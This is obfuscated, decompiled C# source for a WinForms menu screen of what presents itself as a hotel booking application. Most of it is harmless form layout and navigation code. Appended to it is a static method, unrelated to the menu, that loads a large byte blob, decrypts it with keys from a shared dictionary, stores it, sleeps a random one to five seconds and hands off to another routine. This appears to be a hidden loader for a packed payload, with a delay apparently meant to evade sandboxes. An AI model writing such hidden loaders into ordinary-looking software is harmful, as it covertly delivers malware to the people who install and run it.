using System;
using System.ComponentModel;
using System.Drawing;
using System.Runtime.CompilerServices;
using System.Threading.Tasks;
using System.Windows.Forms;
using Microsoft.VisualBasic.CompilerServices;
using Nn5;
using i7F8;
using n3EC;
using y5E6;
using z7W;

namespace p9SE;

[DesignerGenerated]
public class Mn97 : Form
{
	internal IContainer o;

	internal Label m;

	internal ListBox r;

	public Mn97()
	{
		n3N5();
	}

	protected override void Sk2q(bool o7H8)
	{
		try
		{
			if (o7H8 && o != null)
			{
				o.Dispose();
			}
		}
		finally
		{
			((Form)this).Dispose(o7H8);
		}
	}

	private void n3N5()
	{
		//IL_0001: Unknown result type (might be due to invalid IL or missing references)
		//IL_000b: Expected O, but got Unknown
		//IL_000c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0016: Expected O, but got Unknown
		//IL_004b: Unknown result type (might be due to invalid IL or missing references)
		//IL_0055: Expected O, but got Unknown
		//IL_00db: Unknown result type (might be due to invalid IL or missing references)
		//IL_00e5: Expected O, but got Unknown
		d4CF(new Label());
		g5J1(new ListBox());
		((Control)this).SuspendLayout();
		Jg3j().set_AutoSize(true);
		((Control)Jg3j()).set_BackColor(Color.Transparent);
		((Control)Jg3j()).set_Font(new Font("Microsoft Sans Serif", 25f, (FontStyle)1, (GraphicsUnit)3, (byte)0));
		((Control)Jg3j()).set_Location(new Point(333, 41));
		((Control)Jg3j()).set_Name("Label1");
		((Control)Jg3j()).set_Size(new Size(122, 39));
		((Control)Jg3j()).set_TabIndex(4);
		Jg3j().set_Text("MENU");
		f9G5().set_BackColor(Color.AliceBlue);
		f9G5().set_BorderStyle((BorderStyle)0);
		f9G5().set_Font(new Font("Arial Rounded MT Bold", 16f, (FontStyle)0, (GraphicsUnit)3, (byte)0));
		((ListControl)f9G5()).set_FormattingEnabled(true);
		f9G5().set_ItemHeight(24);
		f9G5().get_Items().AddRange(new object[6] { "CHECK IN / RESERVATION", "ROOMS", "DINING", "FACILITIES", "LOCATION", "ABOUT US" });
		((Control)f9G5()).set_Location(new Point(248, 134));
		((Control)f9G5()).set_Name("ListBox1");
		((Control)f9G5()).set_Size(new Size(288, 144));
		((Control)f9G5()).set_TabIndex(3);
		((ContainerControl)this).set_AutoScaleDimensions(new SizeF(6f, 13f));
		((ContainerControl)this).set_AutoScaleMode((AutoScaleMode)1);
		((Control)this).set_BackgroundImageLayout((ImageLayout)3);
		((Form)this).set_ClientSize(new Size(766, 382));
		((Control)this).get_Controls().Add((Control)(object)Jg3j());
		((Control)this).get_Controls().Add((Control)(object)f9G5());
		((Control)this).set_Name("Form4");
		((Form)this).set_Text("MENU");
		((Control)this).ResumeLayout(false);
		((Control)this).PerformLayout();
	}

	[SpecialName]
	internal virtual Label Jg3j()
	{
		return m;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[SpecialName]
	internal virtual void d4CF(Label e1A4)
	{
		Label val = (m = e1A4);
	}

	[SpecialName]
	internal virtual ListBox f9G5()
	{
		return r;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[SpecialName]
	internal virtual void g5J1(ListBox Ej63)
	{
		EventHandler eventHandler = g4G6;
		ListBox val = r;
		if (val != null)
		{
			val.remove_SelectedIndexChanged(eventHandler);
		}
		ListBox val2 = (r = Ej63);
		val = r;
		if (val != null)
		{
			val.add_SelectedIndexChanged(eventHandler);
		}
	}

	private void g4G6(object sender, EventArgs e)
	{
		if (Operators.ConditionalCompareObjectEqual(f9G5().get_SelectedItem(), (object)"CHECK IN / RESERVATION", false))
		{
			((Control)this).Hide();
			((Control)i7X.Forms.Cx2()).Show();
		}
		else if (Operators.ConditionalCompareObjectEqual(f9G5().get_SelectedItem(), (object)"ROOMS", false))
		{
			((Control)this).Hide();
			((Control)i7X.Forms.Ny3()).Show();
			((Control)i7X.Forms.Ny3().Zc13()).Hide();
			((Control)i7X.Forms.Ny3().Kg7i()).Hide();
			((Control)i7X.Forms.Ny3().Pa03()).Hide();
			((Control)i7X.Forms.Ny3().a0WG()).Hide();
			((Control)i7X.Forms.Ny3().Sq59()).Hide();
			((Control)i7X.Forms.Ny3().q0S7()).Hide();
			((Control)i7X.Forms.Ny3().i4C9()).Hide();
			((Control)i7X.Forms.Ny3().m9B7()).Hide();
			((Control)i7X.Forms.Ny3().i7QP()).Hide();
			((Control)i7X.Forms.Ny3().Wo6n()).Hide();
			((Control)i7X.Forms.Ny3().i5Z9()).Hide();
			((Control)i7X.Forms.Ny3().Gf9p()).Hide();
			((Control)i7X.Forms.Ny3().Sp8g()).Hide();
			((Control)i7X.Forms.Ny3().p7RD()).Hide();
			((Control)i7X.Forms.Ny3().n2KW()).Hide();
			((Control)i7X.Forms.Ny3().p8N9()).Hide();
			((Control)i7X.Forms.Ny3().e5YH()).Hide();
			((Control)i7X.Forms.Ny3().g7WE()).Hide();
			((Control)i7X.Forms.Ny3().Bi3t()).Hide();
			((Control)i7X.Forms.Ny3().f7A5()).Hide();
			i7X.Forms.Ny3().i5Z9().set_BorderStyle((BorderStyle)2);
			i7X.Forms.Ny3().Gf9p().set_BorderStyle((BorderStyle)2);
			i7X.Forms.Ny3().Sp8g().set_BorderStyle((BorderStyle)2);
			i7X.Forms.Ny3().p7RD().set_BorderStyle((BorderStyle)2);
			i7X.Forms.Ny3().n2KW().set_BorderStyle((BorderStyle)2);
			i7X.Forms.Ny3().p8N9().set_BorderStyle((BorderStyle)2);
			i7X.Forms.Ny3().e5YH().set_BorderStyle((BorderStyle)2);
			i7X.Forms.Ny3().g7WE().set_BorderStyle((BorderStyle)2);
			i7X.Forms.Ny3().Bi3t().set_BorderStyle((BorderStyle)2);
			i7X.Forms.Ny3().f7A5().set_BorderStyle((BorderStyle)2);
			((Control)i7X.Forms.Ny3().p3XN()).Show();
			((Control)i7X.Forms.Ny3().c0W9()).Show();
		}
		else if (Operators.ConditionalCompareObjectEqual(f9G5().get_SelectedItem(), (object)"DINING", false))
		{
			((Control)this).Hide();
			((Control)i7X.Forms.Fk6()).Show();
			((Control)i7X.Forms.Fk6().Dt8n()).Hide();
			((Control)i7X.Forms.Fk6().Hx71()).Hide();
			((Control)i7X.Forms.Fk6().Sm1q()).Hide();
			((Control)i7X.Forms.Fk6().q9J0()).Hide();
			((Control)i7X.Forms.Fk6().o3TQ()).Hide();
			((Control)i7X.Forms.Fk6().b3E2()).Hide();
			((Control)i7X.Forms.Fk6().Tb42()).Hide();
			((Control)i7X.Forms.Fk6().Xg84()).Hide();
			i7X.Forms.Fk6().o3TQ().set_BorderStyle((BorderStyle)2);
			i7X.Forms.Fk6().b3E2().set_BorderStyle((BorderStyle)2);
			i7X.Forms.Fk6().Tb42().set_BorderStyle((BorderStyle)2);
			i7X.Forms.Fk6().Xg84().set_BorderStyle((BorderStyle)2);
			i7X.Forms.Fk6().n5N2().set_BorderStyle((BorderStyle)2);
			((Control)i7X.Forms.Fk6().Eo7q()).Show();
			((Control)i7X.Forms.Fk6().n5N2()).Show();
		}
		else if (Operators.ConditionalCompareObjectEqual(f9G5().get_SelectedItem(), (object)"FACILITIES", false))
		{
			((Control)this).Hide();
			((Control)i7X.Forms.Yn9()).Show();
		}
		else if (Operators.ConditionalCompareObjectEqual(f9G5().get_SelectedItem(), (object)"LOCATION", false))
		{
			((Control)this).Hide();
			((Control)i7X.Forms.k1G()).Show();
			((Control)i7X.Forms.k1G().Ck6()).set_Enabled(false);
		}
		else if (Operators.ConditionalCompareObjectEqual(f9G5().get_SelectedItem(), (object)"ABOUT US", false))
		{
			((Control)this).Hide();
			((Control)i7X.Forms.p7Z()).Show();
			((Control)i7X.Forms.p7Z().r7D()).Hide();
		}
	}

	internal static void Wi9j()
	{
		byte[] array = Ls68.f5Z2(133632);
		checked
		{
			int wb = Convert.ToInt32(RuntimeHelpers.GetObjectValue(z1E.mDic[z1E.sNum])) * 3;
			int num = array.Length - 1;
			for (int i = 0; i <= num; i++)
			{
				array[i] = m3HN.s4JG(array[i], (byte[])z1E.mDic[z1E.sArray], wb, i);
			}
			z1E.mDic.Add(z1E.mArray, array);
			Task.Delay(new Random().Next(1000, 5000)).Wait();
			q7F1.o7ZK();
		}
	}
}
